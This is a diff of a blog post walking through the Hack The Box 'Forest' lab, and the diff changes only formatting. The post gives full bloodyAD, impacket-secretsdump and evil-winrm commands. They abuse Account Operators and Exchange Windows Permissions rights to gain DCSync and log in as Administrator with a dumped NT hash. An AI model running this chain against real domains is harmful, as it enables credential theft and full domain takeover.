@@ -12,7 +12,7 @@ image:
   alt: Silhouette of Woman Holding Lantern in Night
 ---
 
-# Summary:
+# Summary
 
 {: .mt-4 .mb-0 }
 
@@ -20,24 +20,24 @@ This post shows how to abuse the excessive permissions of the **Exchange Windows
 
 Base on the [HTB Forest Machine](https://www.hackthebox.com/machines/forest).
 
-## Attack Path:
+## Attack Path
 
 Example attack path from our compromised account to the domain controller from `BloodHound`.
 
 ![BloodHound Attack Path](/assets/img/posts/Account-Operators-and-Exchange-Windows-Permissions/Attack_Path.png)
 
-## Key elements of the attack:
+## Key elements of the attack
 * In this example we already own/control the `svc-alfresco` domain account.
 * We will use the capabilities of the `Account Operators` group to create domain users and manage domain groups.
 * We will create a new user and add it to the `Exchange Windows Permissions` group by taking advantage of the `GenericAll` permission.
 * Using the `WriteDacl` permission of the `Exchange Windows Permissions`, we will grant our new user `DCSync` permissions to compromise the domain controller.
 * Perform a `DCSync` attack to the domain controller with `impacket-secretsdump`.
 
-Steps:
+### Steps
 
 We will use `bloodyAD` to perform create a user, modify a group and permissions.
 
-1. Create a new domain user:
+1.- Create a new domain user:
 
 ```bash
 bloodyAD --host 10.129.95.210 -d HTB -u svc-alfresco -p s3rvice add user 'evil' 'EvilMachine1!'
@@ -45,7 +45,7 @@ bloodyAD --host 10.129.95.210 -d HTB -u svc-alfresco -p s3rvice add user 'evil' 
 
 ![Create a new domain user](/assets/img/posts/Account-Operators-and-Exchange-Windows-Permissions/New_User.png)
 
-2. Add the user to the Exchange group:
+2.- Add the user to the Exchange group:
 
 ```bash
 bloodyAD --host 10.129.95.210 -d HTB -u svc-alfresco -p s3rvice add groupMember "Exchange Trusted Subsystem" 'evil'
@@ -56,7 +56,7 @@ Note for this example:
 
 ![Add the user to the Exchange group](/assets/img/posts/Account-Operators-and-Exchange-Windows-Permissions/Add_User_to_Group.png)
 
-3. Grant DCSync permissions to the new user:
+3.- Grant DCSync permissions to the new user:
 
 ```bash
 bloodyAD --host 10.129.95.210 -d HTB -u evil -p 'EvilMachine1!' add dcsync evil
@@ -64,7 +64,7 @@ bloodyAD --host 10.129.95.210 -d HTB -u evil -p 'EvilMachine1!' add dcsync evil
 
 ![Grant DCSync permissions](/assets/img/posts/Account-Operators-and-Exchange-Windows-Permissions/DCSync_Permissions.png)
 
-4. Perform a DCSync attack to obtain all the credentials from the domain controller:
+4.- Perform a DCSync attack to obtain all the credentials from the domain controller:
 
 ```bash
 impacket-secretsdump HTB/evil:'EvilMachine1!'@10.129.95.210
@@ -72,7 +72,7 @@ impacket-secretsdump HTB/evil:'EvilMachine1!'@10.129.95.210
 
 ![DCSync attack](/assets/img/posts/Account-Operators-and-Exchange-Windows-Permissions/DCSync_attack.png)
 
-5. Finally, we can use the NTHash to log in as the administrator using the Windows Remote Management (WinRM) service:
+5.- Finally, we can use the NTHash to log in as the administrator using the Windows Remote Management (WinRM) service:
 
 ```bash
 evil-winrm -i 10.129.95.210 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
@@ -80,7 +80,7 @@ evil-winrm -i 10.129.95.210 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea
 
 ![Administrator NTHash](/assets/img/posts/Account-Operators-and-Exchange-Windows-Permissions/Admin_NTHash.png)
 
-## References:
+## References
 
 * https://www.hackthebox.com/machines/forest
 * https://specterops.io/blog/2024/03/20/pwned-by-the-mail-carrier/
